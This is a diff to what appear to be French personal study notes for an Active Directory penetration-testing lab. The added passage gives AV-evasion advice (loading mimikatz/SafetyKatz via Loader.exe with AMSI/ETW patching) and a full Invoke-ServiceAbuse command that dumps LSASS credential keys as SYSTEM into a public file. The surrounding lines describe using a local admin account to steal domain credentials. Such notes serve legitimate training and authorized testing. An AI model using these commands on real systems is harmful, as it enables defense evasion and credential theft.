@@ -44,6 +44,10 @@
 6. Choisir le saut suivant (lateral / abuse ACL / delegation…)
 ```
 
+> [!danger] Binaires offensifs → JAMAIS bruts
+> `mimikatz` / `SafetyKatz` / `Rubeus` lancés bruts = signatures → Defender/ASR les bloquent (notif). Toujours via **`Loader.exe`** (mémoire + patch AMSI/ETW) + commandes **`evasive-*`** (`evasive-keys`…) + bypass AMSI. **SafetyKatz ≠ bypass AV** (juste moins signaturé). Vrai même quand SYSTEM: le service qui lance le .exe brut se fait choper pareil. Cf [[Cheatsheet - Évasion et OPSEC]].
+> → payload de service évasif: `Invoke-ServiceAbuse -Name <svc> -Command "cmd /c C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args sekurlsa::evasive-keys exit > C:\Users\Public\o.txt"`
+
 > [!warning] Compte LOCAL ≠ DOMAINE — et « pourquoi j'ai john »
 > `Invoke-ServiceAbuse` **exécute une commande en tant que compte du service (SYSTEM)**. Sans `-Command`, PowerUp lance sa charge par défaut = créer l'admin **local** `john`. Donc john = **preuve** que tu exécutes en SYSTEM, **pas** l'objectif.
 > Un admin **local** = contrôle de la **machine** seulement (jamais dans BloodHound, zéro portée AD). Sa **seule** valeur : dump LSASS → voler des **creds de DOMAINE**, qui eux font avancer.
